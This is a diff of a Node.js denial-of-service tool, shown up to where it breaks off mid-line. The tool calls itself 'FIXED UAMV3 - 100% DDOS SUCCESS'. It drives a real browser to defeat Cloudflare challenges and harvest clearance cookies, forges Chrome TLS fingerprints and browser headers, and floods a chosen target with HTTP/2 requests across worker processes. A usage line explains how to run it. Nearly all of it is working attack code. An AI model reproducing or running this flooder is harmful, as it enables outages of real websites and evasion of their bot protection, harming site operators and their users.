@@ -1,18 +1,18 @@
-const { Connect } = require("puppeteer-real-browser");
-const Http2 = require("http2");
-const Tls = require("tls");
-const Cluster = require("cluster");
-const Url = require("url");
-const Crypto = require("crypto");
-const Fs = require("fs");
-const Os = require("os");
-const Hpack = require('hpack');
+const { connect } = require("puppeteer-real-browser");
+const http2 = require("http2");
+const tls = require("tls");
+const cluster = require("cluster");
+const url = require("url");
+const crypto = require("crypto");
+const fs = require("fs");
+const os = require("os");
+const HPACK = require('hpack');
 
-function GetAdvancedChromeTlsOptions(parsedTarget) {
-    const ChromeProfiles = [
+function getAdvancedChromeTlsOptions(parsedTarget) {
+    const chromeProfiles = [
         {
-            Version: 131,
-            Ciphers: [
+            version: 131,
+            ciphers: [
                 'TLS_AES_128_GCM_SHA256', 'TLS_AES_256_GCM_SHA384', 'TLS_CHACHA20_POLY1305_SHA256',
                 'ECDHE-ECDSA-AES128-GCM-SHA256', 'ECDHE-RSA-AES128-GCM-SHA256', 'ECDHE-ECDSA-AES256-GCM-SHA384',
                 'ECDHE-RSA-AES256-GCM-SHA384', 'ECDHE-ECDSA-CHACHA20-POLY1305', 'ECDHE-RSA-CHACHA20-POLY1305',
@@ -21,8 +21,8 @@ function GetAdvancedChromeTlsOptions(parsedTarget) {
             ]
         },
         {
-            Version: 130,
-            Ciphers: [
+            version: 130,
+            ciphers: [
                 'TLS_AES_128_GCM_SHA256', 'TLS_AES_256_GCM_SHA384', 'TLS_CHACHA20_POLY1305_SHA256',
                 'ECDHE-ECDSA-AES128-GCM-SHA256', 'ECDHE-RSA-AES128-GCM-SHA256', 'ECDHE-ECDSA-AES256-GCM-SHA384',
                 'ECDHE-RSA-AES256-GCM-SHA384', 'ECDHE-ECDSA-CHACHA20-POLY1305', 'ECDHE-RSA-CHACHA20-POLY1305',
@@ -30,8 +30,8 @@ function GetAdvancedChromeTlsOptions(parsedTarget) {
             ]
         },
         {
-            Version: 129,
-            Ciphers: [
+            version: 129,
+            ciphers: [
                 'TLS_AES_128_GCM_SHA256', 'TLS_AES_256_GCM_SHA384', 'TLS_CHACHA20_POLY1305_SHA256',
                 'ECDHE-ECDSA-AES128-GCM-SHA256', 'ECDHE-RSA-AES128-GCM-SHA256', 'ECDHE-ECDSA-AES256-GCM-SHA384',
                 'ECDHE-RSA-AES256-GCM-SHA384', 'ECDHE-ECDSA-CHACHA20-POLY1305', 'ECDHE-RSA-CHACHA20-POLY1305',
@@ -40,451 +40,450 @@ function GetAdvancedChromeTlsOptions(parsedTarget) {
         }
     ];
 
-    const Profile = ChromeProfiles[Math.floor(Math.random() * ChromeProfiles.length)];
-    const SupportedGroups = ['x25519', 'secp256r1', 'secp384r1'];
-    const SigAlgs = [
+    const profile = chromeProfiles[Math.floor(Math.random() * chromeProfiles.length)];
+    const supportedGroups = ['x25519', 'secp256r1', 'secp384r1'];
+    const sigAlgs = [
         'ecdsa_secp256r1_sha256', 'rsa_pss_rsae_sha256', 'rsa_pkcs1_sha256', 'ecdsa_secp384r1_sha384',
         'rsa_pss_rsae_sha384', 'rsa_pkcs1_sha384', 'rsa_pss_rsae_sha512', 'rsa_pkcs1_sha512'
     ];
     
-    const ShuffledCiphers = [...Profile.Ciphers];
+    const shuffledCiphers = [...profile.ciphers];
     if (Math.random() < 0.05) {
-        const I = ShuffledCiphers.length - 1, J = Math.max(0, I - 1);
-        [ShuffledCiphers[I], ShuffledCiphers[J]] = [ShuffledCiphers[J], ShuffledCiphers[I]];
+        const i = shuffledCiphers.length - 1, j = Math.max(0, i - 1);
+        [shuffledCiphers[i], shuffledCiphers[j]] = [shuffledCiphers[j], shuffledCiphers[i]];
     }
 
     return {
-        Ciphers: ShuffledCiphers.join(':'),
-        Sigalgs: SigAlgs.join(':'),
-        Groups: SupportedGroups.join(':'),
-        MinVersion: 'TLSv1.2',
-        MaxVersion: 'TLSv1.3',
-        SecureOptions: Crypto.constants.SSL_OP_NO_RENEGOTIATION | Crypto.constants.SSL_OP_NO_TICKET |
-                       Crypto.constants.SSL_OP_NO_SSLv2 | Crypto.constants.SSL_OP_NO_SSLv3 |
-                       Crypto.constants.SSL_OP_NO_COMPRESSION,
-        RejectUnauthorized: false,
-        Servername: parsedTarget.Host
+        ciphers: shuffledCiphers.join(':'),
+        sigalgs: sigAlgs.join(':'),
+        groups: supportedGroups.join(':'),
+        minVersion: 'TLSv1.2',
+        maxVersion: 'TLSv1.3',
+        secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET |
+                       crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 |
+                       crypto.constants.SSL_OP_NO_COMPRESSION,
+        rejectUnauthorized: false,
+        servername: parsedTarget.host
     };
 }
 
-function GenerateAdvancedBrowserHeaders(userAgentFromBypass) {
-    const ChromeVersion = parseInt((userAgentFromBypass.match(/Chrome\/(\d+)/) || [])[1] || '131');
-    const FullVersion = `${ChromeVersion}.0.${Math.floor(Math.random() * 5000)}.${Math.floor(Math.random() * 100)}`;
+function generateAdvancedBrowserHeaders(userAgentFromBypass) {
+    const chromeVersion = parseInt((userAgentFromBypass.match(/Chrome\/(\d+)/) || [])[1] || '131');
+    const fullVersion = `${chromeVersion}.0.${Math.floor(Math.random() * 5000)}.${Math.floor(Math.random() * 100)}`;
 
-    const BrandTemplates = [
-        `"Google Chrome";v="${ChromeVersion}", "Chromium";v="${ChromeVersion}", "Not-A.Brand";v="99"`,
-        `"Chromium";v="${ChromeVersion}", "Google Chrome";v="${ChromeVersion}", "Not;A=Brand";v="8"`,
-        `"Not)A;Brand";v="99", "Google Chrome";v="${ChromeVersion}", "Chromium";v="${ChromeVersion}"`
+    const brandTemplates = [
+        `"Google Chrome";v="${chromeVersion}", "Chromium";v="${chromeVersion}", "Not-A.Brand";v="99"`,
+        `"Chromium";v="${chromeVersion}", "Google Chrome";v="${chromeVersion}", "Not;A=Brand";v="8"`,
+        `"Not)A;Brand";v="99", "Google Chrome";v="${chromeVersion}", "Chromium";v="${chromeVersion}"`
     ];
-    const BrandValue = BrandTemplates[Math.floor(Math.random() * BrandTemplates.length)];
+    const brandValue = brandTemplates[Math.floor(Math.random() * brandTemplates.length)];
 
-    const Platforms = ['"Windows"', '"macOS"', '"Linux"', '"Android"'];
-    const Platform = Platforms[Math.floor(Math.random() * Platforms.length)];
+    const platforms = ['"Windows"', '"macOS"', '"Linux"', '"Android"'];
+    const platform = platforms[Math.floor(Math.random() * platforms.length)];
 
-    const Archs = ['"x86"', '"arm"', '"x64"', '""'];
-    const Arch = Archs[Math.floor(Math.random() * Archs.length)];
+    const archs = ['"x86"', '"arm"', '"x64"', '""'];
+    const arch = archs[Math.floor(Math.random() * archs.length)];
 
-    const Models = ['""', '"Intel Mac OS X 10_15_7"', '"Windows NT 10.0; Win64; x64"', '"SM-G960F"'];
-    const Model = Models[Math.floor(Math.random() * Models.length)];
+    const models = ['""', '"Intel Mac OS X 10_15_7"', '"Windows NT 10.0; Win64; x64"', '"SM-G960F"'];
+    const model = models[Math.floor(Math.random() * models.length)];
 
-    const Bitness = ['"64"', '"32"', '""'][Math.floor(Math.random() * 3)];
+    const bitness = ['"64"', '"32"', '""'][Math.floor(Math.random() * 3)];
 
-    const ColorSchemes = ['light', 'dark', 'no-preference'];
-    const ColorScheme = ColorSchemes[Math.floor(Math.random() * ColorSchemes.length)];
+    const colorSchemes = ['light', 'dark', 'no-preference'];
+    const colorScheme = colorSchemes[Math.floor(Math.random() * colorSchemes.length)];
 
-    const Languages = [
+    const languages = [
         "en-US,en;q=0.9,vi;q=0.8",
         "en-GB,en;q=0.9",
         "fr-FR,fr;q=0.9,en;q=0.8",
         "de-DE,de;q=0.9,en;q=0.8",
         "es-ES,es;q=0.9,en;q=0.8"
     ];
-    const AcceptLanguage = Languages[Math.floor(Math.random() * Languages.length)];
+    const acceptLanguage = languages[Math.floor(Math.random() * languages.length)];
 
     return {
-        "Sec-Ch-Ua": BrandValue,
-        "Sec-Ch-Ua-Mobile": Platform === '"Android"' ? "?1" : "?0",
-        "Sec-Ch-Ua-Platform": Platform,
-        "Sec-Ch-Ua-Arch": Arch,
-        "Sec-Ch-Ua-Model": Model,
-        "Sec-Ch-Ua-Platform-Version": `"${Math.floor(Math.random() * 15) + 10}.0.0"`,
-        "Sec-Ch-Ua-Full-Version-List": `"Not)A;Brand";v="${FullVersion}", "Chromium";v="${FullVersion}", "Google Chrome";v="${FullVersion}"`,
-        "Sec-Ch-Ua-Bitness": Bitness,
-        "Sec-Ch-Prefers-Color-Scheme": ColorScheme,
-        "Upgrade-Insecure-Requests": "1",
-        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-        "Sec-Fetch-Site": "none",
-        "Sec-Fetch-Mode": "navigate",
-        "Sec-Fetch-User": "?1",
-        "Sec-Fetch-Dest": "document",
-        "Accept-Encoding": "gzip, deflate, br, zstd",
-        "Accept-Language": AcceptLanguage,
-        "Origin": `https://${parsedTarget.Host}`,
-        "Referer": Math.random() < 0.5 ? `https://${parsedTarget.Host}/` : ""
+        "sec-ch-ua": brandValue,
+        "sec-ch-ua-mobile": platform === '"Android"' ? "?1" : "?0",
+        "sec-ch-ua-platform": platform,
+        "sec-ch-ua-arch": arch,
+        "sec-ch-ua-model": model,
+        "sec-ch-ua-platform-version": `"${Math.floor(Math.random() * 15) + 10}.0.0"`,
+        "sec-ch-ua-full-version-list": `"Not)A;Brand";v="${fullVersion}", "Chromium";v="${fullVersion}", "Google Chrome";v="${fullVersion}"`,
+        "sec-ch-ua-bitness": bitness,
+        "sec-ch-prefers-color-scheme": colorScheme,
+        "upgrade-insecure-requests": "1",
+        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+        "sec-fetch-site": "none",
+        "sec-fetch-mode": "navigate",
+        "sec-fetch-user": "?1",
+        "sec-fetch-dest": "document",
+        "accept-encoding": "gzip, deflate, br, zstd",
+        "accept-language": acceptLanguage,
+        "origin": `https://${parsedTarget.host}`,
+        "referer": Math.random() < 0.5 ? `https://${parsedTarget.host}/` : ""
     };
 }
 
-function GetBrowserLikeHeaderOrder() {
-    const BaseOrder = [
-        ':Method',
-        ':Authority',
-        ':Scheme',
-        ':Path',
-        'User-Agent',
-        'Sec-Ch-Ua',
-        'Sec-Ch-Ua-Mobile',
-        'Sec-Ch-Ua-Platform',
-        'Sec-Ch-Ua-Arch',
-        'Sec-Ch-Ua-Model',
-        'Sec-Ch-Ua-Platform-Version',
-        'Sec-Ch-Ua-Full-Version-List',
-        'Sec-Ch-Ua-Bitness',
-        'Sec-Ch-Prefers-Color-Scheme',
-        'Upgrade-Insecure-Requests',
-        'Accept',
-        'Sec-Fetch-Site',
-        'Sec-Fetch-Mode',
-        'Sec-Fetch-User',
-        'Sec-Fetch-Dest',
-        'Accept-Encoding',
-        'Accept-Language',
-        'Origin',
-        'Referer',
-        'Cookie'
+function getBrowserLikeHeaderOrder() {
+    const baseOrder = [
+        ':method',
+        ':authority',
+        ':scheme',
+        ':path',
+        'user-agent',
+        'sec-ch-ua',
+        'sec-ch-ua-mobile',
+        'sec-ch-ua-platform',
+        'sec-ch-ua-arch',
+        'sec-ch-ua-model',
+        'sec-ch-ua-platform-version',
+        'sec-ch-ua-full-version-list',
+        'sec-ch-ua-bitness',
+        'sec-ch-prefers-color-scheme',
+        'upgrade-insecure-requests',
+        'accept',
+        'sec-fetch-site',
+        'sec-fetch-mode',
+        'sec-fetch-user',
+        'sec-fetch-dest',
+        'accept-encoding',
+        'accept-language',
+        'origin',
+        'referer',
+        'cookie'
     ];
-    const SecChStart = BaseOrder.indexOf('Sec-Ch-Ua');
-    const SecChEnd = BaseOrder.indexOf('Upgrade-Insecure-Requests');
-    const SecChSection = BaseOrder.slice(SecChStart, SecChEnd);
+    const secChStart = baseOrder.indexOf('sec-ch-ua');
+    const secChEnd = baseOrder.indexOf('upgrade-insecure-requests');
+    const secChSection = baseOrder.slice(secChStart, secChEnd);
     if (Math.random() < 0.2) {
-        for (let I = SecChSection.length - 1; I > 0; I--) {
-            const J = Math.floor(Math.random() * (I + 1));
-            [SecChSection[I], SecChSection[J]] = [SecChSection[J], SecChSection[I]];
+        for (let i = secChSection.length - 1; i > 0; i--) {
+            const j = Math.floor(Math.random() * (i + 1));
+            [secChSection[i], secChSection[j]] = [secChSection[j], secChSection[i]];
         }
     }
-    return [...BaseOrder.slice(0, SecChStart), ...SecChSection, ...BaseOrder.slice(SecChEnd)];
+    return [...baseOrder.slice(0, secChStart), ...secChSection, ...baseOrder.slice(secChEnd)];
 }
 
-function BuildHeadersInOrder(headersObj, order) {
-    const OrderedHeaders = {};
-    order.forEach(Key => {
-        if (headersObj.hasOwnProperty(Key)) {
-            OrderedHeaders[Key] = headersObj[Key];
+function buildHeadersInOrder(headersObj, order) {
+    const orderedHeaders = {};
+    order.forEach(key => {
+        if (headersObj.hasOwnProperty(key)) {
+            orderedHeaders[key] = headersObj[key];
         }
     });
-    Object.keys(headersObj).forEach(Key => {
-        if (!order.includes(Key)) {
-            OrderedHeaders[Key] = headersObj[Key];
+    Object.keys(headersObj).forEach(key => {
+        if (!order.includes(key)) {
+            orderedHeaders[key] = headersObj[key];
         }
     });
-    return OrderedHeaders;
+    return orderedHeaders;
 }
 
-function Randstr(length) {
-    const Chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
-    let Result = "";
-    for (let I = 0; I < length; I++) {
-        Result += Chars[Math.floor(Math.random() * Chars.length)];
+function randstr(length) {
+    const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+    let result = "";
+    for (let i = 0; i < length; i++) {
+        result += chars[Math.floor(Math.random() * chars.length)];
     }
-    return Result;
+    return result;
 }
 
-function GenerateCacheBuster() {
-    const Params = ['_', 'cb', 't', 'cache', 'v'];
-    const Param = Params[Math.floor(Math.random() * Params.length)];
-    const Value = Date.now() + Math.floor(Math.random() * 10000);
-    return `${Param}=${Value}`;
+function generateCacheBuster() {
+    const params = ['_', 'cb', 't', 'cache', 'v'];
+    const param = params[Math.floor(Math.random() * params.length)];
+    const value = Date.now() + Math.floor(Math.random() * 10000);
+    return `${param}=${value}`;
 }
 
-async function BypassCloudflareOnce(attemptNum = 1) {
-    let Response = null;
-    let Browser = null;
-    let Page = null;
+async function bypassCloudflareOnce(attemptNum = 1) {
+    let response = null;
+    let browser = null;
+    let page = null;
     try {
-        console.log(`\x1b[32m[+] Starting Bypass Attempt ${attemptNum}...\x1b[0m`);
-        Response = await Connect({
-            Headless: 'auto',
-            Args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-gpu', '--window-size=1920,1080'],
-            Turnstile: true,
+        console.log(`[+] STARTING BYPASS ATTEMPT ${attemptNum}...`);
+        response = await connect({
+            headless: 'auto',
+            args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-gpu', '--window-size=1920,1080'],
+            turnstile: true,
         });
-        Browser = Response.Browser;
-        Page = Response.Page;
-        await Page.goto(Args.Target, { WaitUntil: 'domcontentloaded', Timeout: 45000 });
-        console.log("\x1b[32m[+] Checking For Cloudflare Challenge...\x1b[0m");
+        browser = response.browser;
+        page = response.page;
+        await page.goto(args.target, { waitUntil: 'domcontentloaded', timeout: 45000 });
+        console.log("[+] CHECKING FOR CLOUDFLARE CHALLENGE...");
         
-        let ChallengeCompleted = false;
-        let WaitCount = 0;
-        while (!ChallengeCompleted) {
-            await new Promise(R => setTimeout(R, 500));
-            WaitCount++;
-            const Cookies = await Page.cookies();
-            if (Cookies.some(C => C.Name === "cf_clearance")) {
-                ChallengeCompleted = true;
-                console.log(`\x1b[32m[+] Cf_clearance Cookie Found After ${WaitCount * 0.5} Seconds.\x1b[0m`);
+        let challengeCompleted = false;
+        let waitCount = 0;
+        while (!challengeCompleted) {
+            await new Promise(r => setTimeout(r, 500));
+            waitCount++;
+            const cookies = await page.cookies();
+            if (cookies.some(c => c.name === "cf_clearance")) {
+                challengeCompleted = true;
+                console.log(`[+] CF_CLEARANCE COOKIE FOUND AFTER ${waitCount * 0.5} SECONDS.`);
                 break;
             }
-            if (WaitCount % 20 === 0) {
-                console.log(`\x1b[32m[+] Still Waiting For Cf_clearance Cookie... (${WaitCount * 0.5} Seconds Elapsed)\x1b[0m`);
+            if (waitCount % 20 === 0) {
+                console.log(`[+] STILL WAITING FOR CF_CLEARANCE COOKIE... (${waitCount * 0.5} SECONDS ELAPSED)`);
             }
         }
 
-        const Cookies = await Page.cookies();
-        const UserAgent = await Page.evaluate(() => navigator.UserAgent);
-        await Browser.close();
+        const cookies = await page.cookies();
+        const userAgent = await page.evaluate(() => navigator.userAgent);
+        await browser.close();
         
-        if (!Cookies.some(C => C.Name === "cf_clearance")) {
-             throw new Error("Cf_clearance Cookie Not Found After Wait.");
+        if (!cookies.some(c => c.name === "cf_clearance")) {
+             throw new Error("CF_CLEARANCE COOKIE NOT FOUND AFTER WAIT.");
         }
 
-        console.log(`\x1b[32m[+] Bypass Attempt ${attemptNum} Successful.\x1b[0m`);
-        return { Cookies, UserAgent, Success: true, AttemptNum: attemptNum };
+        console.log(`[+] BYPASS ATTEMPT ${attemptNum} SUCCESSFUL.`);
+        return { cookies, userAgent, success: true, attemptNum };
     } catch (error) {
-        console.log(`\x1b[32m[+] Bypass Attempt ${attemptNum} Failed: ${error.message}\x1b[0m`);
-        try { if (Browser) await Browser.close(); } catch (e) {}
-        return { Cookies: [], UserAgent: "", Success: false, AttemptNum: attemptNum };
+        console.log(`[+] BYPASS ATTEMPT ${attemptNum} FAILED: ${error.message}`);
+        try { if (browser) await browser.close(); } catch (e) {}
+        return { cookies: [], userAgent: "", success: false, attemptNum };
     }
 }
 
-async function BypassCloudflareParallel(totalCount) {
-    console.log("\x1b[32m[+] Cloudflare Bypass - Parallel Mode\x1b[0m");
+async function bypassCloudflareParallel(totalCount) {
+    console.log("[+] CLOUDFLARE BYPASS - PARALLEL MODE");
     
-    const Results = [];
-    let AttemptCount = 0;
-    const BatchSize = 3;
+    const results = [];
+    let attemptCount = 0;
+    const batchSize = 3;
     
-    while (Results.length < totalCount) {
-        const Remaining = totalCount - Results.length;
-        const CurrentBatchSize = Math.min(BatchSize, Remaining);
-        console.log(`\x1b[32m[+] Starting Parallel Batch (${CurrentBatchSize} Sessions)...\x1b[0m`);
+    while (results.length < totalCount) {
+        const remaining = totalCount - results.length;
+        const currentBatchSize = Math.min(batchSize, remaining);
+        console.log(`[+] STARTING PARALLEL BATCH (${currentBatchSize} SESSIONS)...`);
         
-        const BatchPromises = Array.from({ Length: CurrentBatchSize }, () => BypassCloudflareOnce(++AttemptCount));
-        const BatchResults = await Promise.all(BatchPromises);
+        const batchPromises = Array.from({ length: currentBatchSize }, () => bypassCloudflareOnce(++attemptCount));
+        const batchResults = await Promise.all(batchPromises);
         
-        for (const Result of BatchResults) {
-            if (Result.Success && Result.Cookies.length > 0) {
-                Results.push(Result);
-                console.log(`\x1b[32m[+] Session ${Result.AttemptNum} Obtained! (Total: ${Results.length}/${totalCount})\x1b[0m`);
+        for (const result of batchResults) {
+            if (result.success && result.cookies.length > 0) {
+                results.push(result);
+                console.log(`[+] SESSION ${result.attemptNum} OBTAINED! (TOTAL: ${results.length}/${totalCount})`);
             } else {
-                console.log(`\x1b[32m[+] Session ${Result.AttemptNum} Failed\x1b[0m`);
+                console.log(`[+] SESSION ${result.attemptNum} FAILED`);
             }
         }
-        if (Results.length < totalCount) await new Promise(R => setTimeout(R, 2000));
+        if (results.length < totalCount) await new Promise(r => setTimeout(r, 2000));
     }
-    return Results.length > 0 ? Results : [{ Cookies: [], UserAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36" }];
+    return results.length > 0 ? results : [{ cookies: [], userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36" }];
 }
 
-async function RunFlooder() {
-    const BypassInfo = Global.BypassData[Math.floor(Math.random() * Global.BypassData.length)];
-    if (!BypassInfo || !BypassInfo.UserAgent) return;
+async function runFlooder() {
+    const bypassInfo = global.bypassData[Math.floor(Math.random() * global.bypassData.length)];
+    if (!bypassInfo || !bypassInfo.userAgent) return;
 
-    const CookieString = BypassInfo.Cookies.map(C => `${C.Name}=${C.Value}`).join("; ");
-    const AdvancedHeaders = GenerateAdvancedBrowserHeaders(BypassInfo.UserAgent);
-    const TlsOptions = GetAdvancedChromeTlsOptions(ParsedTarget);
+    const cookieString = bypassInfo.cookies.map(c => `${c.name}=${c.value}`).join("; ");
+    const advancedHeaders = generateAdvancedBrowserHeaders(bypassInfo.userAgent);
+    const tlsOptions = getAdvancedChromeTlsOptions(parsedTarget);
 
-    const Client = Http2.connect(Args.Target, {
-        CreateConnection: (authority, option) => {
-            return Tls.connect({
-                ...TlsOptions,
-                Port: 443,
-                Host: ParsedTarget.Host,
-                AlpnProtocols: ['h2'],
+    const client = http2.connect(args.target, {
+        createConnection: (authority, option) => {
+            return tls.connect({
+                ...tlsOptions,
+                port: 443,
+                host: parsedTarget.host,
+                ALPNProtocols: ['h2'],
             });
         },
-        Settings: {
-            HeaderTableSize: 262144,
-            MaxConcurrentStreams: 100,
-            InitialWindowSize: 6291456,
-            MaxHeaderListSize: 4096
+        settings: {
+            headerTableSize: 262144,
+            maxConcurrentStreams: 100,
+            initialWindowSize: 6291456,
+            maxHeaderListSize: 4096
         }
     });
 
-    const ConnectionId = Math.random().toString(36).substring(2);
-    Global.ActiveConnections.add(ConnectionId);
+    const connectionId = Math.random().toString(36).substring(2);
+    global.activeConnections.add(connectionId);
 
-    Client.on('connect', async () => {
-        const AttackInterval = setInterval(async () => {
-            if (Client.destroyed) {
-                clearInterval(AttackInterval);
+    client.on('connect', async () => {
+        const attackInterval = setInterval(async () => {
+            if (client.destroyed) {
+                clearInterval(attackInterval);
                 return;
             }
             try {
-                for (let I = 0; I < Args.Rate; I++) {
-                    await new Promise(R => setTimeout(R, 50 + Math.floor(Math.random() * 150)));
+                for (let i = 0; i < args.Rate; i++) {
+                    await new Promise(r => setTimeout(r, 50 + Math.floor(Math.random() * 150)));
 
-                    const QuerySeparator = ParsedTarget.Path.includes('?') ? '&' : '?';
-                    const PathWithBuster = ParsedTarget.Path + QuerySeparator + GenerateCacheBuster();
+                    const querySeparator = parsedTarget.path.includes('?') ? '&' : '?';
+                    const pathWithBuster = parsedTarget.path + querySeparator + generateCacheBuster();
 
-                    let Headers = {
-                        ":Method": "GET",
-                        ":Authority": ParsedTarget.Host,
-                        ":Scheme": "https",
-                        ":Path": PathWithBuster,
-                        "User-Agent": BypassInfo.UserAgent,
-                        "Cookie": CookieString,
-                        ...AdvancedHeaders
+                    let headers = {
+                        ":method": "GET",
+                        ":authority": parsedTarget.host,
+                        ":scheme": "https",
+                        ":path": pathWithBuster,
+                        "user-agent": bypassInfo.userAgent,
+                        "cookie": cookieString,
+                        ...advancedHeaders
                     };
 
-                    const HeaderOrder = GetBrowserLikeHeaderOrder();
-                    Headers = BuildHeadersInOrder(Headers, HeaderOrder);
+                    const headerOrder = getBrowserLikeHeaderOrder();
+                    headers = buildHeadersInOrder(headers, headerOrder);
 
-                    const Req = Client.request(Headers);
+                    const req = client.request(headers);
 
-                    Req.on('response', (resHeaders) => {
-                        const Status = resHeaders[':Status'];
-                        if (!Global.Statuses[Status]) Global.Statuses[Status] = 0;
-                        Global.Statuses[Status]++;
-                        Global.TotalRequests = (Global.TotalRequests || 0) + 1;
-                        Req.close();
+                    req.on('response', (resHeaders) => {
+                        const status = resHeaders[':status'];
+                        if (!global.statuses[status]) global.statuses[status] = 0;
+                        global.statuses[status]++;
+                        global.totalRequests = (global.totalRequests || 0) + 1;
+                        req.close();
                     });
 
-                    Req.on('error', () => {
-                        if (!Global.Statuses["ERROR"]) Global.Statuses["ERROR"] = 0;
-                        Global.Statuses["ERROR"]++;
-                        Global.TotalRequests = (Global.TotalRequests || 0) + 1;
-                        Req.close();
+                    req.on('error', () => {
+                        if (!global.statuses["ERROR"]) global.statuses["ERROR"] = 0;
+                        global.statuses["ERROR"]++;
+                        global.totalRequests = (global.totalRequests || 0) + 1;
+                        req.close();
                     });
 
-                    Req.end();
+                    req.end();
                 }
             } catch (e) {}
         }, 1000);
 
         setTimeout(() => {
-            clearInterval(AttackInterval);
-            Client.close();
+            clearInterval(attackInterval);
+            client.close();
         }, 30000);
     });
 
-    const Cleanup = () => {
-        Global.ActiveConnections.delete(ConnectionId);
-        Client.destroy();
+    const cleanup = () => {
+        global.activeConnections.delete(connectionId);
+        client.destroy();
     };
-    Client.on('error', Cleanup);
-    Client.on('close', Cleanup);
+    client.on('error', cleanup);
+    client.on('close', cleanup);
 }
 
-function DisplayStats() {
-    const Elapsed = Math.floor((Date.now() - Global.StartTime) / 1000);
-    const Remaining = Math.max(0, Args.Time - Elapsed);
+function displayStats() {
+    const elapsed = Math.floor((Date.now() - global.startTime) / 1000);
+    const remaining = Math.max(0, args.time - elapsed);
     
     console.clear();
-    console.log("\x1b[32m[+] Fixed Uamv3 - 100% Ddos Success\x1b[0m");
-    console.log(`\x1b[32m[+] Target: ${Args.Target}\x1b[0m`);
-    console.log(`\x1b[32m[+] Time: ${Elapsed}s / ${Args.Time}s\x1b[0m`);
-    console.log(`\x1b[32m[+] Remaining: ${Remaining}s\x1b[0m`);
-    console.log(`\x1b[32m[+] Config: Rate: ${Args.Rate}/s | Threads: ${Args.Threads}\x1b[0m`);
-    console.log(`\x1b[32m[+] Sessions: ${Global.BypassData ? Global.BypassData.length : 0} / ${Args.CookieCount} Requested\x1b[0m`);
+    console.log("[+] FIXED UAMV3 - 100% DDOS SUCCESS");
+    console.log(`[+] TARGET: ${args.target}`);
+    console.log(`[+] TIME: ${elapsed}S / ${args.time}S`);
+    console.log(`[+] REMAINING: ${remaining}S`);
+    console.log(`[+] CONFIG: RATE: ${args.Rate}/S | THREADS: ${args.threads} | SESSION: ${global.bypassData ? global.bypassData.length : 0} / ${args.cookieCount} REQUESTED`);
 
-    let TotalStatuses = {};
-    let TotalRequests = 0;
-    for (let W in Global.Workers) {
-        if (Global.Workers[W][0].State == 'online') {
-            const Msg = Global.Workers[W][1];
-            for (let St of Msg.StatusesQ) {
-                for (let Code in St) {
-                    if (!TotalStatuses[Code]) TotalStatuses[Code] = 0;
-                    TotalStatuses[Code] += St[Code];
+    let totalStatuses = {};
+    let totalRequests = 0;
+    for (let w in global.workers) {
+        if (global.workers[w][0].state == 'online') {
+            const msg = global.workers[w][1];
+            for (let st of msg.statusesQ) {
+                for (let code in st) {
+                    if (!totalStatuses[code]) totalStatuses[code] = 0;
+                    totalStatuses[code] += st[code];
                 }
             }
-            TotalRequests += Msg.TotalRequests || 0;
+            totalRequests += msg.totalRequests || 0;
         }
     }
-    console.log(`\x1b[32m[+] Statistics:\x1b[0m`);
-    console.log(`\x1b[32m[+] Total Requests: ${TotalRequests}\x1b[0m`);
-    console.log(`\x1b[32m[+] Rate: ${Elapsed > 0 ? (TotalRequests / Elapsed).toFixed(2) : 0} Req/s\x1b[0m`);
-    console.log(`\x1b[32m[+] Status Codes: ${JSON.stringify(TotalStatuses)}\x1b[0m`);
+    console.log(`[+] STATISTICS:`);
+    console.log(`   [+] TOTAL REQUESTS: ${totalRequests}`);
+    console.log(`   [+] RATE: ${elapsed > 0 ? (totalRequests / elapsed).toFixed(2) : 0} REQ/S`);
+    console.log(`   [+] STATUS CODES:`, totalStatuses);
 
-    const Progress = Math.floor((Elapsed / Args.Time) * 30);
-    const ProgressBar = "█".repeat(Progress) + "░".repeat(30 - Progress);
-    console.log(`\x1b[32m[+] Progress: [${ProgressBar}]\x1b[0m`);
+    const progress = Math.floor((elapsed / args.time) * 30);
+    const progressBar = "█".repeat(progress) + "░".repeat(30 - progress);
+    console.log(`\n[+] PROGRESS: [${progressBar}]`);
 }
 
-Global.ActiveConnections = new Set();
-Global.Workers = {};
-Global.StartTime = Date.now();
-Global.BypassData = [];
+global.activeConnections = new Set();
+global.workers = {};
+global.startTime = Date.now();
+global.bypassData = [];
 
 if (process.argv.length < 7) {
-    console.log("\x1b[32m[+] Usage: Node Fixed.js <Target> <Time> <Rate> <Threads> <Cookiecount>\x1b[0m");
-    console.log("\x1b[32m[+] Example: Node Fixed.js Https://example.com 60 100 8 5\x1b[0m");
+    console.log(`[+] USAGE: NODE ${process.argv[1]} <TARGET> <TIME> <RATE> <THREADS> <COOKIECOUNT>`);
+    console.log(`[+] EXAMPLE: NODE ${process.argv[1]} HTTPS://EXAMPLE.COM 60 100 8 5`);
     process.exit(1);
 }
 
-const Args = {
-    Target: process.argv[2],
-    Time: parseInt(process.argv[3]),
+const args = {
+    target: process.argv[2],
+    time: parseInt(process.argv[3]),
     Rate: parseInt(process.argv[4]),
-    Threads: parseInt(process.argv[5]),
-    CookieCount: parseInt(process.argv[6]) || 4
+    threads: parseInt(process.argv[5]),
+    cookieCount: parseInt(process.argv[6]) || 2
 };
 
-const ParsedTarget = Url.parse(Args.Target);
+const parsedTarget = url.parse(args.target);
 
-if (Cluster.isMaster) {
+if (cluster.isMaster) {
     console.clear();
-    console.log("\x1b[32m[+] Fixed Uamv3 - 100% Ddos Success\x1b[0m");
+    console.log("[+] FIXED UAMV3 - 100% DDOS SUCCESS");
     
     (async () => {
-        const BypassResults = await BypassCloudflareParallel(Args.CookieCount);
